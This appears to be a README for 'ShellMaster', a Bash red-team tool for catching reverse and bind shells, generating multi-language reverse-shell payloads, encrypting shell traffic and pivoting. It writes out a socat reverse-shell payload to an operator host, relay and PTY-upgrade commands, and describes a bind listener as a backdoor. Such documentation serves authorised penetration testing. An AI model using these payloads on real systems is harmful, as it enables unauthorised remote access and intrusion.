## 🔍 Overview

ShellMaster is a **controller–module CLI** built entirely in Bash. It wraps standard Unix networking tools (`nc`, `socat`, `openssl`, `ssh`) into an interactive menu-driven interface, enabling operators to:

- Catch and manage reverse/bind shell connections
- Generate payloads for Bash, PowerShell, Python, Perl, Ruby, and PHP
- Establish SSL/TLS-encrypted shell channels
- Transfer files via SCP or a one-command HTTP server
- Create port-forwarding relays and SSH tunnels
- Stabilize limited shells into full interactive PTYs
- Annotate sessions with text notes for report writing

All activity is logged to `logs/framework.log` for audit purposes.

### Required

| Tool | Purpose |
|------|---------|
| `bash` 4.0+ | Core runtime |
| `nc` / `ncat` / `netcat` | Listeners and connections (any variant) |

### Optional (feature-specific)

| Tool | Purpose | Used by |
|------|---------|---------|
| `socat` | Encrypted listeners and port relays | Encryption, Relay |
| `openssl` | Certificate generation | Encryption |
| `ssh` / `scp` | SSH tunneling and file transfer | Transfer, Relay |
| `python3` | HTTP file server, PTY upgrade | Transfer, PTY Upgrade |
| `rlwrap` | Command history and line editing in listeners | Listeners |

### Install dependencies : Debian / Ubuntu

```bash
sudo apt update && sudo apt install -y netcat-traditional socat openssl rlwrap openssh-client python3
```

### Install dependencies : RHEL / CentOS

```bash
sudo yum install -y ncat socat openssl rlwrap openssh-clients python3
```

---

## ⚙️ Installation

### Option 1 : Git (recommended)

```bash
git clone https://github.com/taguianas/redteam-shell-framework.git
cd redteam-shell-framework
bash shellmaster.sh
```

### Option 2 : wget

```bash
wget https://github.com/taguianas/redteam-shell-framework/archive/refs/heads/main.zip
unzip main.zip
cd redteam-shell-framework-main
bash shellmaster.sh
```

### Option 3 : curl

```bash
curl -L https://github.com/taguianas/redteam-shell-framework/archive/refs/heads/main.zip -o framework.zip
unzip framework.zip
cd redteam-shell-framework-main
bash shellmaster.sh
```

> `git` is only needed to clone the repository. The framework itself depends only on standard Bash and Unix tools.

### Running on Windows

The framework requires a **Unix Bash environment**. On Windows, use **Git Bash**:

1. Right-click the project folder → **Git Bash Here**
2. Run `bash shellmaster.sh`

> PowerShell and CMD are not supported.

---

## 🚀 Usage

Run the main controller from the project root:

```bash
bash shellmaster.sh
```

The interactive menu will load:

```
  ____  _          _ _ __  __           _

## 🧩 Modules

### 1. Listeners

Start a reverse or bind listener on any port. The framework auto-detects which netcat variant is installed (`ncat`, OpenBSD `nc`, or traditional `nc`) and uses the correct flags for each. Optionally wrap with `rlwrap` for command history. Each session is assigned a unique ID and logged to `logs/sessions/`. After a session ends you are prompted to add a note; notes can also be managed from the menu at any time.

```
1. Start Reverse Listener   : catches incoming shells on a port
2. Start Bind Listener      : opens a backdoor that waits for connection
3. List Active Listeners    : shows active nc/ncat processes
4. Stop Listener            : kill by PID
5. Session Notes            : add or view notes on any session
6. Back
```

### 2. Payload Generator

Generate ready-to-use reverse shell one-liners. Your local IP is auto-detected and pre-filled : just confirm or override it. Supports Base64 encoding and saving to `payloads/` with metadata.

```
1.  Bash Reverse Shell
2.  PowerShell Reverse Shell
3.  Python Reverse Shell
4.  Perl Reverse Shell
5.  Ruby Reverse Shell
6.  PHP Reverse Shell
7.  One-Liner Templates
8.  View Generated Payloads
9.  Batch Generate (All Types)
10. Back
```

### 3. Encrypted Listener

Wraps shell traffic in SSL/TLS using `socat` and a self-signed RSA-2048 certificate stored in `certs/`. Prevents cleartext inspection of the connection.

```
1. Generate New Certificate
2. Start Encrypted Listener (socat SSL)
3. Generate Encrypted Payload (for target)
4. Back
```

**Target payload:**
```bash
socat OPENSSL:<LHOST>:<LPORT>,verify=0 EXEC:/bin/bash
```

### 4. File Transfer

Upload and download files over SCP, or spin up a quick HTTP server for targets that don't have SSH. Verify file integrity with MD5 and SHA256 after transfer.

```
1. Upload File          : local → remote via SCP
2. Download File        : remote → local via SCP
3. Serve Files (HTTP)   : python3 -m http.server with auto-detected IP and copy-paste wget/curl commands
4. Verify Checksum      : MD5 + SHA256 of any file
5. View Transfer History
6. Back
```

### 5. Relay / Pivot

Create port-forwarding relays with `socat` or SSH tunnels to pivot through intermediate hosts.

```
1. Create socat Relay   : forward: listen_port → host:port
2. Create SSH Tunnel    : local (-L), remote (-R), or SOCKS (-D)
3. List Active Relays
4. Stop Relay
5. Back
```

**socat relay example:**
```bash
socat TCP-LISTEN:4444,fork,reuseaddr TCP:192.168.1.50:4444
```

### 6. Shell Stabilization

Step-by-step commands to upgrade a limited reverse shell to a fully interactive PTY.

```
1. Python PTY Upgrade    : pty.spawn('/bin/bash') + stty raw -echo
2. Script PTY Upgrade    : script -qc /bin/bash /dev/null
3. Fix Environment       : TERM, PATH, stty rows/cols, reset
4. Enable Terminal Features : history, colour prompt, tab completion
5. Back
```
